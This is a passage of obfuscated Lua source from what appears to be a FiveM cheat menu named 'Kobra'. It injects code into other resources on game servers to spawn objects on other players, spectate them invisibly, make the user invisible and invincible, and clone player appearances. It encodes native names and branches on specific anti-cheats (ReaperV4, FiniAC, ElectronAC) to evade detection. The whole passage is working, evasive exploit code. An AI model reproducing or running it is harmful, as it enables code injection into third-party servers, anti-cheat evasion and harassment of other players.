                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v214,v340));v216=v216 + 1 ;break;end end elseif (GetResourceState("lc_fuel")=="started") then local v1126=0 -0 ;while true do if (v1126==(0 + 0)) then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v214,v340));v216=v216 + (487 -(68 + 418)) ;break;end end elseif (GetResourceState("0r-illegalpack")=="started") then local v1238=0 -0 ;while true do if ((0 -0)==v1238) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v214,v340));v216=v216 + 1 ;break;end end elseif (GetResourceState("xradio")=="started") then local v1345=0 + 0 ;while true do if (v1345==(1092 -(770 + 322))) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v214,v340));v216=v216 + 1 + 0 ;break;end end else local v1346=0 + 0 ;while true do if (v1346==(0 + 0)) then MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v215,v340));v216=v216 + 1 ;break;end end end end v212:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v214,v216, #v213),5000);end;v12.HandleSpectateToggle=function(v217,v218,v219) local v220=0;local v221;local v222;while true do if (v220==(3 -0)) then if v222 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v221)) then local v977=0 -0 ;while true do if (0==v977) then v217:Notify("error","Kobra","Target player not found!",8170 -5170 );print("[ReaperV4 Spectate] Error: No player found for server ID:",v221);v977=3 -2 ;end if (v977==(1 + 0)) then return;end end end local v767=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v219),v221);local v768,v769=load(v767);if v768 then local v978=0 -0 ;local v979;local v980;while true do if (v978==(0 + 0)) then v979,v980=pcall(v768);if  not v979 then local v1285=0 + 0 ;while true do if ((0 + 0)==v1285) then print("[ReaperV4 Spectate] Execution error:",v980);v217:Notify("error","Kobra","Failed to execute spectate code!",3000);break;end end else print("[ReaperV4 Spectate] Code executed successfully");end break;end end else local v981=0;while true do if (v981==0) then print("[ReaperV4 Spectate] Load error:",v769);v217:Notify("error","Kobra","Failed to load spectate code!",11296 -8296 );break;end end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then local v982=0;while true do if (v982==(0 -0)) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v219),v221));break;end end else local v983=0;while true do if (v983==0) then print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v219),v221));break;end end end break;end if (v220==(1 + 1)) then if v219 then v217:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v221)) or "Unknown" ,v221),13819 -10819 );else v217:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v221)) or "Unknown" ,v221),9916 -6916 );end v222=GetResourceState("ReaperV4")=="started" ;v220=3;end if ((1 + 0)==v220) then if  not v221 then v217:Notify("error","Kobra","Invalid server ID format!",14845 -11845 );return;end if (v221==tonumber(GetPlayerServerId(PlayerId()))) then local v770=0;while true do if ((831 -(762 + 69))==v770) then v217:Notify("error","Kobra","You cannot spectate yourself!",9714 -6714 );return;end end end v220=2;end if (v220==0) then if  not v218 then local v771=0 + 0 ;while true do if (v771==(0 + 0)) then v217:Notify("error","Kobra","Invalid player ID provided!",7256 -4256 );return;end end end v221=tonumber(v218);v220=1;end end end;local v73={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v74() for v341,v342 in ipairs(v73) do if (GetResourceState(v342)=="started") then return v342;end end return nil;end local v75=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v75="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v75="core";end v12.EnableInvisibility=function(v223) local v224=0 -0 ;local v225;while true do if (v224==(6 -3)) then v225("SetEntityVisible",function(v679,v680,v681,v682) local v683=0 + 0 ;while true do if (v683==(0 -0)) then if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v679(v680,false,v682);end return v679(v680,v681,v682);end end end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end v224=8 -4 ;end if (1==v224) then v225("CreateThread",function(v684,...) return v684(...);end);v225("PlayerPedId",function(v685,...) return v685(...);end);v224=2 + 0 ;end if (2==v224) then v225("IsEntityVisible",function(v686,...) return true;end);v225("IsEntityVisibleToScript",function(v687,...) return true;end);v224=1810 -(518 + 1289) ;end if (v224==(0 -0)) then v225=nil;function v225(v688,v689) local v690=0 + 0 ;local v691;while true do if (v690==1) then _G[v688]=function(...) return v689(v691,...);end;break;end if (v690==0) then v691=_G[v688];if ( not v691 or (type(v691)~="function")) then return;end v690=1;end end end v224=1 -0 ;end if (v224==(3 + 1)) then if  not _G.osintInvisibility.enabled then local v772=469 -(304 + 165) ;local v773;while true do if (v772==(0 + 0)) then _G.osintInvisibility.enabled=true;v773=PlayerPedId();v772=1;end if (v772==(161 -(54 + 106))) then _G.osintInvisibility.wasVisible=IsEntityVisible(v773);SetEntityVisible(v773,false,false);v772=2;end if (v772==2) then CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v1169=PlayerPedId();if (v1169 and DoesEntityExist(v1169)) then SetEntityVisible(v1169,false,false);end Wait(500);end end);break;end end end break;end end end;v12.DisableInvisibility=function(v226) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v543=1969 -(1618 + 351) ;local v544;while true do if (v543==(1 + 0)) then if (v544 and DoesEntityExist(v544)) then SetEntityVisible(v544,_G.osintInvisibility.wasVisible,false);end break;end if (v543==(1016 -(10 + 1006))) then _G.osintInvisibility.enabled=false;v544=PlayerPedId();v543=1 + 0 ;end end end end;v12.HandleAttackClonePlayer=function(v227,v228) local v229=0 + 0 ;local v230;while true do if ((0 -0)==v229) then if ( not v228 or ( #v228==(1033 -(912 + 121)))) then return;end v230=table.concat(v228,",");v229=1 + 0 ;end if (v229==2) then MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
